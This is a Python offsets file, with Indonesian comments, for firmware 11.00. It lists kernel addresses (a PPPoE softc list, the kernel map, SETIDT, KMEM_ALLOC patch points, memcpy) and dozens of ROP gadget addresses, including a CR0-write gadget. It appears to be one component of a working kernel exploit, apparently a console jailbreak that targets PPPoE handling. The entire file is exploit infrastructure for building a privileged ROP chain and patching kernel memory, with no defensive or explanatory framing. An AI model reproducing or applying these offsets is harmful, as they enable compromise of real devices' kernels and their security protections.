# FW 11.00
class OffsetsFirmware_1100:
    # Alamat untuk daftar PPPOE_SOFTC
    PPPOE_SOFTC_LIST = 0xffffffff844e2578

    # Alamat untuk peta kernel
    KERNEL_MAP = 0xffffffff843ff130

    # Alamat untuk SETIDT
    SETIDT = 0xffffffff8245bdb0

    # Alamat untuk alokasi KMEM
    KMEM_ALLOC = 0xffffffff82445e10
    KMEM_ALLOC_PATCH1 = 0xffffffff82445edc
    KMEM_ALLOC_PATCH2 = 0xffffffff82445ee4

    # Alamat untuk fungsi memcpy
    MEMCPY = 0xffffffff824dddf0

    # Alamat untuk gadget MOV_CR0_RSI_UD2_MOV_EAX_1_RET
    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff824f1299

    # Offset untuk gadget kedua
    SECOND_GADGET_OFF = 0x3e

    # Alamat untuk gadget pertama
    FIRST_GADGET = 0xffffffff82eb1f97

    # Alamat untuk PUSH_RBP_JMP_QWORD_PTR_RSI
    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c75166

    # Alamat untuk POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10
    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff824b90e1

    # Alamat untuk LEA_RSP_RSI_20_REPZ_RET
    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff8293c8c6

    # Alamat untuk ADD_RSP_28_POP_RBP_RET
    ADD_RSP_28_POP_RBP_RET = 0xffffffff826cb2da

    # Alamat untuk ADD_RSP_B0_POP_RBP_RET
    ADD_RSP_B0_POP_RBP_RET = 0xffffffff824cdd5f

    # Alamat untuk RET
    RET = 0xffffffff822007e4

    # Alamat untuk POP_RDI_RET
    POP_RDI_RET = 0xffffffff825f38ed

    # Alamat untuk POP_RSI_RET
    POP_RSI_RET = 0xffffffff8224a6a9

    # Alamat untuk POP_RDX_RET
    POP_RDX_RET = 0xffffffff822a4762

    # Alamat untuk POP_RCX_RET
    POP_RCX_RET = 0xffffffff8221170a

    # Alamat untuk POP_R8_POP_RBP_RET
    POP_R8_POP_RBP_RET = 0xffffffff8224ae4d

    # Alamat untuk POP_R12_RET
    POP_R12_RET = 0xffffffff8279faaf

    # Alamat untuk POP_RAX_RET
    POP_RAX_RET = 0xffffffff8221172e

    # Alamat untuk POP_RBP_RET
    POP_RBP_RET = 0xffffffff822008df

    # Alamat untuk PUSH_RSP_POP_RSI_RET
    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb5c7a

    # Alamat untuk MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX
    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff823ce260

    # Alamat untuk MOV_BYTE_PTR_RCX_AL_RET
    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff8236ae58

    # Alamat untuk MOV_RDI_RBX_CALL_R12
    MOV_RDI_RBX_CALL_R12 = 0xffffffff8233426c

    # Alamat untuk MOV_RDI_R14_CALL_R12
    MOV_RDI_R14_CALL_R12 = 0xffffffff823340a7

    # Alamat untuk MOV_RSI_RBX_CALL_RAX
    MOV_RSI_RBX_CALL_RAX = 0xffffffff82512dce

    # Alamat untuk MOV_R14_RAX_CALL_R8
    MOV_R14_RAX_CALL_R8 = 0xffffffff82624df8

    # Alamat untuk ADD_RDI_RCX_RET
    ADD_RDI_RCX_RET = 0xffffffff82cb535a

    # Alamat untuk SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET
    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff8260f297

    # Alamat untuk JMP_R14
    JMP_R14 = 0xffffffff82b84657
